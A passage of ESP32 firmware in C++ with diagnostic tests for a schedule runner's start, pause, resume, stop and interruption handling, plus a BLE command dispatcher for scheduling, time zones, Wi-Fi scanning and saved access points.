      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }
  clearPendingScheduledActions();
  schedulerData = originalSchedulerData;
  nextActionInstanceId = originalNextInstanceId;

  if (passed) {
    Serial.println("[Scheduler] Stage 9B per-schedule Pause/Resume test PASSED.");
    sendSimpleResponse("SCHED_PAUSE_RESUME_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9B per-schedule Pause/Resume test FAILED.");
    sendSimpleResponse("SCHED_PAUSE_RESUME_TEST:FAILED");
  }
}

// Stage 9C diagnostic: stop an individually paused scheduled Action and
// verify that its live instance disappears while its saved configuration stays.
void testPerScheduleStop() {
  if (!timeSynced || actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested || schedulerData.count >= MAX_SCHEDULES) {
    sendSimpleResponse("SCHED_STOP_TEST:BUSY_OR_TIME_NOT_SET");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const uint16_t testScheduleId = 65004;
  ScheduleRecord testSchedule = {};
  testSchedule.id = testScheduleId;
  testSchedule.scheduleType = SCHEDULE_RECURRING;
  testSchedule.actionType = SCHEDULE_ACTION_ALL;
  testSchedule.durationMode = SCHEDULE_ACTIVE_DURATION;
  testSchedule.totalDurationSeconds = 20;
  testSchedule.executionDurationSeconds = 0;
  testSchedule.pauseIntervalSeconds = 0;
  testSchedule.enabled = true;
  schedulerData.records[schedulerData.count++] = testSchedule;

  char response[80] = {0};
  bool passed = startSavedScheduleNow(testScheduleId, response, sizeof(response)) &&
      strstr(response, "SCHED_START:65004:QUEUED") != nullptr;

  ActionInstance instance = {};
  const uint32_t startWaitMs = millis();
  while (passed && static_cast<uint32_t>(millis() - startWaitMs) < 500UL &&
         (!findScheduleActionInstance(testScheduleId, instance) ||
          instance.state != ACTION_INSTANCE_RUNNING)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && findScheduleActionInstance(testScheduleId, instance) &&
      instance.state == ACTION_INSTANCE_RUNNING;

  if (passed) {
    passed = controlScheduleActionInstance(testScheduleId, false,
        response, sizeof(response)) &&
        strstr(response, "SCHED_PAUSE:65004:REQUESTED") != nullptr;
  }
  const uint32_t pauseWaitMs = millis();
  while (passed && static_cast<uint32_t>(millis() - pauseWaitMs) < 500UL &&
         activeActionInstance.state != ACTION_INSTANCE_PAUSED) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && activeActionInstance.scheduleId == testScheduleId &&
      activeActionInstance.state == ACTION_INSTANCE_PAUSED && actionActive;

  if (passed) {
    passed = stopScheduleActionInstance(testScheduleId, response,
        sizeof(response)) &&
        strstr(response, "SCHED_STOP:65004:REQUESTED") != nullptr;
  }

  const uint32_t stopWaitMs = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - stopWaitMs) < 2000UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  const bool runnerClean = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY;
  ActionInstance remaining = {};
  passed = passed && runnerClean &&
      !findScheduleActionInstance(testScheduleId, remaining) &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;

  bool savedSchedulePreserved = false;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == testScheduleId) {
      savedSchedulePreserved = schedulerData.records[i].enabled &&
          schedulerData.records[i].scheduleType == SCHEDULE_RECURRING;
      break;
    }
  }
  passed = passed && savedSchedulePreserved;

  if (!runnerClean && actionActive && actionTaskHandle != nullptr) {
    txAbortRequested = true;
    actionPauseRequested = false;
    actionYieldRequested = false;
    const uint32_t cleanupMs = millis();
    while ((actionActive || actionTaskHandle != nullptr) &&
           static_cast<uint32_t>(millis() - cleanupMs) < 1500UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }
  clearPendingScheduledActions();
  removeInterruptedActionByScheduleId(testScheduleId);
  schedulerData = originalSchedulerData;
  nextActionInstanceId = originalNextInstanceId;

  if (passed) {
    Serial.println("[Scheduler] Stage 9C per-schedule Stop test PASSED.");
    sendSimpleResponse("SCHED_STOP_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9C per-schedule Stop test FAILED.");
    sendSimpleResponse("SCHED_STOP_TEST:FAILED");
  }
}


// Stage 9D diagnostic: exercise per-schedule Start, Pause, Resume, and Stop
// across an interruption handoff. Schedule A must resume after B is stopped;
// stopping A must then leave the runner and interruption stack empty.
void testPerScheduleControlInterruptionIntegration() {
  if (!timeSynced || actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0 ||
      schedulerPauseAllRequested || schedulerData.count > MAX_SCHEDULES - 2) {
    sendSimpleResponse("SCHED_CONTROL_INTEGRATION_TEST:BUSY_OR_TIME_NOT_SET");
    return;
  }

  const SchedulerStorage originalSchedulerData = schedulerData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  const uint16_t scheduleAId = 65005;
  const uint16_t scheduleBId = 65006;
  ScheduleRecord scheduleA = {};
  scheduleA.id = scheduleAId;
  scheduleA.scheduleType = SCHEDULE_ONE_TIME;
  scheduleA.actionType = SCHEDULE_ACTION_ALL;
  scheduleA.durationMode = SCHEDULE_ACTIVE_DURATION;
  scheduleA.totalDurationSeconds = 40;
  scheduleA.executionDurationSeconds = 0;
  scheduleA.pauseIntervalSeconds = 0;
  scheduleA.enabled = true;

  ScheduleRecord scheduleB = scheduleA;
  scheduleB.id = scheduleBId;
  scheduleB.scheduleType = SCHEDULE_RECURRING;
  scheduleB.totalDurationSeconds = 30;

  schedulerData.records[schedulerData.count++] = scheduleA;
  schedulerData.records[schedulerData.count++] = scheduleB;

  char response[96] = {0};
  bool passed = true;
  ActionInstance instanceA = {};
  ActionInstance instanceB = {};

  // Start A and wait until the harmless runner is active.
  passed = startSavedScheduleNow(scheduleAId, response, sizeof(response)) &&
      strstr(response, "SCHED_START:65005:QUEUED") != nullptr;
  uint32_t waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 1000UL &&
         (!findScheduleActionInstance(scheduleAId, instanceA) ||
          instanceA.state != ACTION_INSTANCE_RUNNING)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && findScheduleActionInstance(scheduleAId, instanceA) &&
      instanceA.state == ACTION_INSTANCE_RUNNING &&
      activeActionInstance.scheduleId == scheduleAId;

  // Starting B must cooperatively interrupt A and preserve A on the LIFO stack.
  if (passed) {
    passed = startSavedScheduleNow(scheduleBId, response, sizeof(response)) &&
        strstr(response, "SCHED_START:65006:QUEUED") != nullptr;
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 1500UL &&
         (actionActive || actionTaskHandle != nullptr ||
          interruptedActionCount != 1 || pendingScheduledActionCount != 1)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && !actionActive && actionTaskHandle == nullptr &&
      interruptedActionCount == 1 && pendingScheduledActionCount == 1 &&
      interruptedActionStack[0].scheduleId == scheduleAId &&
      interruptedActionStack[0].state == ACTION_INSTANCE_PAUSED;

  // Dispatch B after A's cooperative task has fully exited.
  if (passed) {
    const time_t now = time(nullptr);
    passed = now > 0 && dispatchNextPendingScheduledAction(
        static_cast<uint32_t>(now));
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 1000UL &&
         (!findScheduleActionInstance(scheduleBId, instanceB) ||
          instanceB.state != ACTION_INSTANCE_RUNNING)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && actionActive && actionTaskHandle != nullptr &&
      activeActionInstance.scheduleId == scheduleBId &&
      activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      interruptedActionCount == 1 &&
      interruptedActionStack[0].scheduleId == scheduleAId;

  // Pause and resume B individually while A remains safely interrupted.
  if (passed) {
    passed = controlScheduleActionInstance(scheduleBId, false,
        response, sizeof(response)) &&
        strstr(response, "SCHED_PAUSE:65006:REQUESTED") != nullptr;
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 750UL &&
         activeActionInstance.state != ACTION_INSTANCE_PAUSED) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && activeActionInstance.scheduleId == scheduleBId &&
      activeActionInstance.state == ACTION_INSTANCE_PAUSED;

  if (passed) {
    passed = controlScheduleActionInstance(scheduleBId, true,
        response, sizeof(response)) &&
        strstr(response, "SCHED_RESUME:65006:REQUESTED") != nullptr &&
        activeActionInstance.state == ACTION_INSTANCE_RUNNING;
  }

  // Stopping B must not discard A; A should resume automatically in LIFO order.
  if (passed) {
    passed = stopScheduleActionInstance(scheduleBId, response,
        sizeof(response)) &&
        strstr(response, "SCHED_STOP:65006:REQUESTED") != nullptr;
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 2000UL &&
         (actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY;

  if (passed) {
    const time_t now = time(nullptr);
    passed = now > 0 && dispatchNextPendingScheduledAction(
        static_cast<uint32_t>(now));
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 1000UL &&
         (!actionActive || actionTaskHandle == nullptr ||
          activeActionInstance.scheduleId != scheduleAId ||
          activeActionInstance.state != ACTION_INSTANCE_RUNNING)) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && actionActive && actionTaskHandle != nullptr &&
      activeActionInstance.scheduleId == scheduleAId &&
      activeActionInstance.state == ACTION_INSTANCE_RUNNING &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;

  // Finally verify Pause, Resume, and Stop on the resumed A instance.
  if (passed) {
    passed = controlScheduleActionInstance(scheduleAId, false,
        response, sizeof(response)) &&
        strstr(response, "SCHED_PAUSE:65005:REQUESTED") != nullptr;
  }
  waitStarted = millis();
  while (passed && static_cast<uint32_t>(millis() - waitStarted) < 750UL &&
         activeActionInstance.state != ACTION_INSTANCE_PAUSED) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  passed = passed && activeActionInstance.scheduleId == scheduleAId &&
      activeActionInstance.state == ACTION_INSTANCE_PAUSED;

  if (passed) {
    passed = controlScheduleActionInstance(scheduleAId, true,
        response, sizeof(response)) &&
        strstr(response, "SCHED_RESUME:65005:REQUESTED") != nullptr &&
        activeActionInstance.state == ACTION_INSTANCE_RUNNING;
  }
  if (passed) {
    passed = stopScheduleActionInstance(scheduleAId, response,
        sizeof(response)) &&
        strstr(response, "SCHED_STOP:65005:REQUESTED") != nullptr;
  }

  waitStarted = millis();
  while ((actionActive || actionTaskHandle != nullptr ||
          activeActionInstance.state != ACTION_INSTANCE_EMPTY) &&
         static_cast<uint32_t>(millis() - waitStarted) < 2000UL) {
    vTaskDelay(pdMS_TO_TICKS(10));
  }
  const bool runnerClean = !actionActive && actionTaskHandle == nullptr &&
      activeActionInstance.state == ACTION_INSTANCE_EMPTY &&
      interruptedActionCount == 0 && pendingScheduledActionCount == 0;
  passed = passed && runnerClean;

  bool oneTimeDisabled = false;
  bool recurringPreserved = false;
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    const ScheduleRecord& record = schedulerData.records[i];
    if (record.id == scheduleAId) {
      oneTimeDisabled = !record.enabled &&
          record.scheduleType == SCHEDULE_ONE_TIME &&
          record.totalDurationSeconds == 40;
    } else if (record.id == scheduleBId) {
      recurringPreserved = record.enabled &&
          record.scheduleType == SCHEDULE_RECURRING &&
          record.totalDurationSeconds == 30;
    }
  }

  // Verify the one-time disabled flag was actually written to Preferences,
  // not merely changed in the in-memory schedulerData copy.
  SchedulerStorage persistedSchedulerData = {};
  bool oneTimeDisabledInFlash =
      schedulerPreferences.getBytesLength(SCHEDULER_RECORDS_KEY) ==
          sizeof(persistedSchedulerData) &&
      schedulerPreferences.getBytes(SCHEDULER_RECORDS_KEY,
          &persistedSchedulerData, sizeof(persistedSchedulerData)) ==
          sizeof(persistedSchedulerData);
  if (oneTimeDisabledInFlash) {
    oneTimeDisabledInFlash = false;
    for (uint8_t i = 0; i < persistedSchedulerData.count; ++i) {
      const ScheduleRecord& record = persistedSchedulerData.records[i];
      if (record.id == scheduleAId) {
        oneTimeDisabledInFlash = !record.enabled &&
            record.scheduleType == SCHEDULE_ONE_TIME;
        break;
      }
    }
  }
  passed = passed && oneTimeDisabled && recurringPreserved &&
      oneTimeDisabledInFlash;

  // Safety cleanup: never leave a diagnostic Action or stack entry running.
  if (actionActive && actionTaskHandle != nullptr) {
    txAbortRequested = true;
    actionPauseRequested = false;
    actionYieldRequested = false;
    waitStarted = millis();
    while ((actionActive || actionTaskHandle != nullptr) &&
           static_cast<uint32_t>(millis() - waitStarted) < 2000UL) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
  }
  clearPendingScheduledActions();
  removeInterruptedActionByScheduleId(scheduleAId);
  removeInterruptedActionByScheduleId(scheduleBId);
  schedulerData = originalSchedulerData;
  const bool originalFlashRestored = saveSchedulerStorage();
  nextActionInstanceId = originalNextInstanceId;
  passed = passed && originalFlashRestored;

  if (passed) {
    Serial.println("[Scheduler] Stage 9D one-time Stop, recurring preservation, and interruption integration test PASSED.");
    sendSimpleResponse("SCHED_CONTROL_INTEGRATION_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9D one-time Stop, recurring preservation, and interruption integration test FAILED; cleanup was attempted.");
    sendSimpleResponse("SCHED_CONTROL_INTEGRATION_TEST:FAILED");
  }
}

// Stage 9G: stable scheduler BLE protocol identification for the Flutter client.
// Protocol v1 keeps schedule records as CSV fields and uses explicit list markers.
static constexpr uint8_t SCHEDULER_BLE_PROTOCOL_VERSION = 1;

void formatSchedulerProtocolInfo(char* output, size_t outputSize) {
  snprintf(output, outputSize,
           "SCHED_PROTOCOL_INFO:%u,%u,UTC,PHONE_IANA,POSIX_TZ,CSV_V1",
           static_cast<unsigned int>(SCHEDULER_BLE_PROTOCOL_VERSION),
           static_cast<unsigned int>(MAX_SCHEDULES));
}

void sendSchedulerProtocolInfo() {
  char response[112];
  formatSchedulerProtocolInfo(response, sizeof(response));
  sendSimpleResponse(response);
}

// Read-only protocol contract check. This intentionally does not create, edit,
// enable, disable, or delete schedules and does not start an Action.
void testSchedulerBleProtocolContract() {
  char info[112] = {0};
  formatSchedulerProtocolInfo(info, sizeof(info));

  const bool infoValid =
      strncmp(info, "SCHED_PROTOCOL_INFO:1,10,UTC,PHONE_IANA,POSIX_TZ,CSV_V1",
              sizeof(info)) == 0;
  const bool listMarkersValid =
      strlen("SCHED_LIST_BEGIN") < MAX_NOTIFY_DATA &&
      strlen("SCHED_LIST_END") < MAX_NOTIFY_DATA;
  const bool runtimeStatusFits =
      strlen("SCHED_RUNTIME_STATUS:PAUSED,4294967295,4,10,10,10,1") < MAX_NOTIFY_DATA;
  const bool instanceStatusFits =
      strlen("SCHED_INSTANCE_STATUS:65535,PAUSE_REQUESTED,4294967295") < MAX_NOTIFY_DATA;
  const bool scheduleItemFits =
      strlen("SCHED_ITEM:65535,1,1,FF:FF:FF:FF:FF:FF,2099,12,31,23,59,127,4294967295,1,315360000,4294967295,30,23,59,604800,604800,1") < MAX_NOTIFY_DATA;

  if (infoValid && listMarkersValid && runtimeStatusFits &&
      instanceStatusFits && scheduleItemFits) {
    Serial.println("[Scheduler] Stage 9G BLE protocol contract test PASSED.");
    sendSimpleResponse("SCHED_BLE_PROTOCOL_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9G BLE protocol contract test FAILED.");
    sendSimpleResponse("SCHED_BLE_PROTOCOL_TEST:FAILED");
  }
}

void processCommand(const char* command) {
  const bool isActionCommand =
      strcmp(command, "ACTION_ALL") == 0 ||
      strncmp(command, "ACTION_ALL:", 11) == 0 ||
      strncmp(command, "ACTION:", 7) == 0;

  if (schedulerPauseAllRequested && isActionCommand) {
    Serial.println("[Command] Rejected: Pause All is active.");
    sendSimpleResponse("SCHED_ERROR:PAUSE_ALL_ACTIVE");
    return;
  }
  if (wifiScanPauseActive && isActionCommand) {
    Serial.println("[Command] Rejected: Wi-Fi scan is pausing the Action runner.");
    sendSimpleResponse("ACTION_ERROR:WIFI_SCAN_ACTIVE");
    return;
  }

  const bool isSavedNetworkMutation =
      strncmp(command, "DELETE_AP:", 10) == 0 ||
      strcmp(command, "CLEAR_SAVED_APS") == 0;
  if ((actionActive || actionTaskHandle != nullptr) && strcmp(command, "STOP") != 0 &&
      ((isSavedNetworkMutation && !networkSaveWindowOpen()) ||
       (strncmp(command, "SAVE_AP:", 8) == 0 && !networkSaveWindowOpen()))) {
    Serial.println("[Command] Rejected: an Action is active or not safely paused.");
    return;
  }

  if (strcmp(command, "PING") == 0) {
    sendSimpleResponse("PONG");
  } else if (strcmp(command, "INFO") == 0) {
    sendSimpleResponse("ESP32-C5-N16R8");
  } else if (strcmp(command, "STATUS") == 0) {
    sendSimpleResponse(wifiScanActive ? "BLE_ONLINE;WIFI_SCANNING" : "BLE_ONLINE;WIFI_IDLE");
  } else if (strncmp(command, "SET_TIME:", 9) == 0) {
    setDeviceTimeFromCommand(command);
  } else if (strcmp(command, "TIME_STATUS") == 0) {
    sendTimeStatus();
  } else if (strncmp(command, "SET_TIMEZONE:", 13) == 0) {
    setDeviceTimezoneFromCommand(command);
  } else if (strcmp(command, "TIMEZONE_STATUS") == 0) {
    sendTimezoneStatus();
  } else if (strcmp(command, "CLEAR_TZ_RULE") == 0) {
    clearPosixTimezoneRule();
  } else if (strncmp(command, "SET_TZ_RULE:", 12) == 0) {
    setPosixTimezoneRuleFromCommand(command);
  } else if (strcmp(command, "TZ_RULE_STATUS") == 0) {
    sendPosixTimezoneRuleStatus();
  } else if (strcmp(command, "SCHED_TZ_RULE_TEST") == 0) {
    testPosixTimezoneRuleConversion();
  } else if (strcmp(command, "SCHED_RECURRING_TEST") == 0) {
    testRecurringScheduleResolution();
  } else if (strcmp(command, "SCHED_RECURRING_QUEUE_TEST") == 0) {
    testRecurringDueQueueIntegration();
  } else if (strcmp(command, "SCHED_AUTO_POLL_TEST") == 0) {
    testAutomaticRecurringPollIntegration();
  } else if (strcmp(command, "SCHED_LIVE_POLL_TEST") == 0) {
    testLiveSchedulerPollRuntimeIntegration();
  } else if (strcmp(command, "SCHED_PROTOCOL_INFO") == 0) {
    sendSchedulerProtocolInfo();
  } else if (strcmp(command, "SCHED_BLE_PROTOCOL_TEST") == 0) {
    testSchedulerBleProtocolContract();
  } else if (strcmp(command, "SCHED_COUNT") == 0) {
    sendSchedulerCount();
  } else if (strcmp(command, "SCHED_LIST") == 0) {
    listSchedules();
  } else if (strncmp(command, "SCHED_ADD_ONCE:", 15) == 0) {
    addOneTimeSchedule(command);
  } else if (strncmp(command, "SCHED_ADD_RECUR:", 16) == 0) {
    addRecurringSchedule(command);
  } else if (strncmp(command, "SCHED_ENABLE:", 13) == 0) {
    changeScheduleEnabled(command);
  } else if (strncmp(command, "SCHED_DELETE:", 13) == 0) {
    deleteSchedule(command);
  } else if (strcmp(command, "SCHED_STORAGE_TEST") == 0) {
    testSchedulerStorage();
  } else if (strcmp(command, "SCHED_INSTANCE_TEST") == 0) {
    testActionInstanceStack();
  } else if (strcmp(command, "SCHED_INSTANCE_REMOVE_TEST") == 0) {
    testActionInstanceRemoval();
  } else if (strcmp(command, "SCHED_TIMING_TEST") == 0) {
    testActionTimingSemantics();
  } else if (strcmp(command, "SCHED_INSTANCE_TIMING_TEST") == 0) {
    testActionInstanceTimingSnapshot();
  } else if (strcmp(command, "SCHED_INSTANCE_TIMING_ADVANCE_TEST") == 0) {
    testActionInstanceTimingAdvance();
  } else if (strcmp(command, "SCHED_INSTANCE_INIT_TEST") == 0) {
    testScheduledActionInstanceInitialization();
  } else if (strcmp(command, "SCHED_PENDING_QUEUE_TEST") == 0) {
    testPendingScheduledActionQueue();
  } else if (strcmp(command, "SCHED_DUE_DETECTION_TEST") == 0) {
    testDueOneTimeScheduleDetection();
  } else if (strcmp(command, "SCHED_RUNNER_LAUNCH_TEST") == 0) {
    testScheduledActionRunnerLaunch();
  } else if (strcmp(command, "SCHED_PENDING_RUNNER_TEST") == 0) {
    testPendingScheduledActionDispatch();
  } else if (strcmp(command, "SCHED_INTERRUPTION_HANDOFF_TEST") == 0) {
    testScheduledInterruptionHandoff();
  } else if (strcmp(command, "SCHED_INTERRUPTION_RESUME_TEST") == 0) {
    testScheduledInterruptionResume();
  } else if (strcmp(command, "SCHED_EMERGENCY_STOP_TEST") == 0) {
    testEmergencyStopAllStoragePreservation();
  } else if (strcmp(command, "SCHED_ACTION_CLOCK_TEST") == 0) {
    testActionInstanceRuntimeClock();
  } else if (strcmp(command, "SCHED_ACTIVE_INSTANCE") == 0) {
    sendActiveActionInstanceStatus();
  } else if (strcmp(command, "SCHED_RUNTIME_STATUS") == 0) {
    sendSchedulerRuntimeStatus();
  } else if (strcmp(command, "SCHED_RUNTIME_STATUS_TEST") == 0) {
    testSchedulerRuntimeStatus();
  } else if (strcmp(command, "SCHED_RUNTIME_LIFECYCLE_TEST") == 0) {
    testSchedulerRuntimeLifecycleConsistency();
  } else if (strcmp(command, "SCHED_MANUAL_START_TEST") == 0) {
    testPerScheduleManualStart();
  } else if (strcmp(command, "SCHED_PAUSE_RESUME_TEST") == 0) {
    testPerSchedulePauseResume();
  } else if (strcmp(command, "SCHED_STOP_TEST") == 0) {
    testPerScheduleStop();
  } else if (strcmp(command, "SCHED_CONTROL_INTEGRATION_TEST") == 0) {
    testPerScheduleControlInterruptionIntegration();
  } else if (strcmp(command, "SCHED_DISABLED_DELETE_CLEANUP_TEST") == 0) {
    testDisabledDeletedScheduleRuntimeCleanup();
  } else if (strcmp(command, "SCHED_LIFECYCLE_TEST") == 0) {
    testSavedScheduleLifecycleRules();
  } else if (strncmp(command, "SCHED_STOP:", 11) == 0) {
    uint32_t scheduleId = 0;
    if (!parseUnsignedValue(command + 11, scheduleId) || scheduleId == 0 ||
        scheduleId > 65535) {
      sendSimpleResponse("SCHED_ERROR:INVALID_ID");
    } else {
      char response[80] = {0};
      stopScheduleActionInstance(static_cast<uint16_t>(scheduleId), response,
                                 sizeof(response));
      sendSimpleResponse(response);
      // Flutter already refreshes its saved schedule list on SCHED_DISABLED.
      // Emit that existing protocol status only after a successful one-time
      // Stop; recurring schedules remain enabled for their next occurrence.
      if (strncmp(response, "SCHED_STOP:", 11) == 0) {
        for (uint8_t i = 0; i < schedulerData.count; ++i) {
          if (schedulerData.records[i].id == scheduleId &&
              schedulerData.records[i].scheduleType == SCHEDULE_ONE_TIME &&
              !schedulerData.records[i].enabled) {
            sendSimpleResponse("SCHED_DISABLED");
            break;
          }
        }
      }
    }
  } else if (strncmp(command, "SCHED_PAUSE:", 12) == 0 ||
             strncmp(command, "SCHED_RESUME:", 13) == 0) {
    const bool resume = strncmp(command, "SCHED_RESUME:", 13) == 0;
    const char* idText = command + (resume ? 13 : 12);
    uint32_t scheduleId = 0;
    if (!parseUnsignedValue(idText, scheduleId) || scheduleId == 0 ||
        scheduleId > 65535) {
      sendSimpleResponse("SCHED_ERROR:INVALID_ID");
    } else {
      char response[80] = {0};
      controlScheduleActionInstance(static_cast<uint16_t>(scheduleId), resume,
                                     response, sizeof(response));
      sendSimpleResponse(response);
    }
  } else if (strncmp(command, "SCHED_INSTANCE_STATUS:", 22) == 0) {
    sendScheduleActionInstanceStatus(command);
  } else if (strncmp(command, "SCHED_START:", 12) == 0) {
    uint32_t scheduleId = 0;
    if (!parseUnsignedValue(command + 12, scheduleId) || scheduleId == 0 ||
        scheduleId > 65535) {
      sendSimpleResponse("SCHED_ERROR:INVALID_ID");
    } else {
      char response[64] = {0};
      startSavedScheduleNow(static_cast<uint16_t>(scheduleId), response,
                            sizeof(response));
      sendSimpleResponse(response);
    }
  } else if (strcmp(command, "WIFI_SCAN") == 0) {
    if (!txNotificationsEnabled) return;
    startWiFiScan();
  } else if (strcmp(command, "SCAN_STATUS") == 0) {
    sendSimpleResponse(wifiScanActive ? "SCAN_RUNNING" : "SCAN_IDLE");
  } else if (strcmp(command, "NETWORK_SAVE_BEGIN") == 0) {
    if (networkSavePauseActive || wifiScanPauseActive) {
      sendSimpleResponse("NETWORK_SAVE_ERROR:BUSY");
      return;
    }
    networkSavePauseActive = true;
    networkSavePauseOwnedAction = false;
    networkSavePauseAckSent = false;
    networkSavePauseStartedMs = millis();
    if (actionActive && actionTaskHandle != nullptr) {
      // If already paused by the user, leave ownership with that pause. If a
      // scheduler interruption is already yielding, let it finish onto stack.
      if (!actionPauseRequested && !actionYieldRequested) {
        networkSavePauseOwnedAction = true;
        actionPauseRequested = true;
        if (activeActionInstance.state == ACTION_INSTANCE_RUNNING) {
          activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
        }
      }
      if (actionPauseRequested &&
          activeActionInstance.state == ACTION_INSTANCE_PAUSED &&
          !actionYieldRequested) {
        notifyNetworkSavePaused();
      }
      Serial.println("[Network Save] Waiting for the active Action to pause safely.");
    } else if (!actionActive && actionTaskHandle == nullptr) {
      notifyNetworkSavePaused();
    } else {
      networkSavePauseActive = false;
      networkSavePauseOwnedAction = false;
      sendSimpleResponse("NETWORK_SAVE_ERROR:RUNNER_BUSY");
    }
  } else if (strcmp(command, "NETWORK_SAVE_END") == 0) {
    networkSavePauseActive = false;
    if (networkSavePauseOwnedAction && actionActive && actionTaskHandle != nullptr &&
        !schedulerPauseAllRequested) {
      actionPauseRequested = false;
      if (activeActionInstance.state == ACTION_INSTANCE_PAUSED ||
          activeActionInstance.state == ACTION_INSTANCE_PAUSE_REQUESTED) {
        activeActionInstance.state = ACTION_INSTANCE_RUNNING;
      }
    }
    networkSavePauseOwnedAction = false;
    networkSavePauseAckSent = false;
    networkSavePauseStartedMs = 0;
    sendSimpleResponse("NETWORK_SAVE_RESUMED");
  } else if (strcmp(command, "GET_SAVED_APS") == 0) {
    if (networkSavePauseActive && !networkSaveWindowOpen()) {
      sendSimpleResponse("NETWORK_SAVE_ERROR:NOT_PAUSED");
      return;
    }
    sendSavedAPs();
  } else if (strncmp(command, "SAVE_AP:", 8) == 0) {
    if (networkSavePauseActive && !networkSaveWindowOpen()) {
      sendSimpleResponse("NETWORK_SAVE_ERROR:NOT_PAUSED");
      return;
    }
    saveAPByBssid(String(command + 8));
  } else if (strncmp(command, "DELETE_AP:", 10) == 0) {
    deleteSavedAP(String(command + 10));
  } else if (strcmp(command, "CLEAR_SAVED_APS") == 0) {
    clearSavedAPs();
  } else if (strcmp(command, "SCHED_EMERGENCY_STOP_ALL") == 0) {
    // Emergency Stop All also disables an active one-time schedule, matching
    // the individual scheduled Stop behavior. Recurring schedules remain
    // enabled so they can run at their next occurrence after Resume All.
    bool oneTimeDisableSaveFailed = false;
    uint16_t activeScheduleId = activeActionInstance.scheduleId;
    if (activeScheduleId != 0 &&
        activeActionInstance.state != ACTION_INSTANCE_EMPTY) {
      for (uint8_t i = 0; i < schedulerData.count; ++i) {
        ScheduleRecord& savedSchedule = schedulerData.records[i];
        if (savedSchedule.id != activeScheduleId) continue;
        if (savedSchedule.scheduleType == SCHEDULE_ONE_TIME &&
            savedSchedule.enabled) {
          savedSchedule.enabled = false;
          if (!saveSchedulerStorage()) {
            savedSchedule.enabled = true;
            oneTimeDisableSaveFailed = true;
            Serial.printf("[Scheduler] Emergency Stop All could not persist Disabled status for one-time schedule %u.\n",
                          static_cast<unsigned int>(activeScheduleId));
          } else {
            Serial.printf("[Scheduler] Emergency Stop All disabled one-time schedule %u in Flash.\n",
                          static_cast<unsigned int>(activeScheduleId));
          }
        }
        break;
      }
    }

    // Keep the scheduler globally paused after the emergency stop. This
    // prevents an automatic restart; the user must explicitly issue
    // SCHED_RESUME_ALL before queued/future due occurrences can run again.
    schedulerPauseAllRequested = true;
    actionPauseRequested = false;
    actionYieldRequested = false;

    if (actionActive && actionTaskHandle != nullptr) {
      txAbortRequested = true;
      Serial.println("[Scheduler] Emergency Stop All requested; active Action is aborting.");
    } else {
      txAbortRequested = false;
      actionActive = false;
      actionTaskHandle = nullptr;
      memset(&activeActionInstance, 0, sizeof(activeActionInstance));
    }

    clearAllActionInstances();
    Serial.println("[Scheduler] Emergency Stop All: active, paused, stacked, and pending Action instances cleared.");
    if (oneTimeDisableSaveFailed) {
      sendSimpleResponse("SCHED_EMERGENCY_STOP_ALL:OK:SAVE_FAILED");
    } else {
      sendSimpleResponse("SCHED_EMERGENCY_STOP_ALL:OK");
    }
  } else if (strcmp(command, "SCHED_PAUSE_ALL") == 0) {
    schedulerPauseAllRequested = true;
    if (actionActive && actionTaskHandle != nullptr && !txAbortRequested) {
      actionPauseRequested = true;
      if (activeActionInstance.state == ACTION_INSTANCE_RUNNING) {
        activeActionInstance.state = ACTION_INSTANCE_PAUSE_REQUESTED;
      }
    }
    Serial.println("[Scheduler] Pause All enabled; due occurrences will queue until Resume All.");
    sendSimpleResponse("SCHED_PAUSE_ALL:OK");
  } else if (strcmp(command, "SCHED_RESUME_ALL") == 0) {
    schedulerPauseAllRequested = false;
    if (actionActive && actionTaskHandle != nullptr && !txAbortRequested) {
      actionPauseRequested = false;
